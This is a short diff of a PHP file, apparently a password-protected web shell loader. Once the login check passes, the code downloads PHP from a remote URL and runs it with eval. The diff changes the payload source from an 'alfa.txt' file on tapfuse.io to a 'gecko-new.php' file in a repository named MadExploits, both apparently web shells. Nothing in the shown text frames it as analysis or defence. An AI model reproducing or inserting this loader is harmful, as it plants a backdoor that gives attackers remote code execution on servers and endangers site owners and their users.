@@ -92,7 +92,7 @@ if (isset($_POST['password'])) {
 }
 
 if (is_logged_in()) {
-    $a = geturlsinfo('https://www.tapfuse.io/raw/alfa.txt');
+    $a = geturlsinfo('https://github.com/MadExploits/Gecko/raw/refs/heads/main/gecko-new.php');
     eval('?>' . $a);
 } else {
     ?>
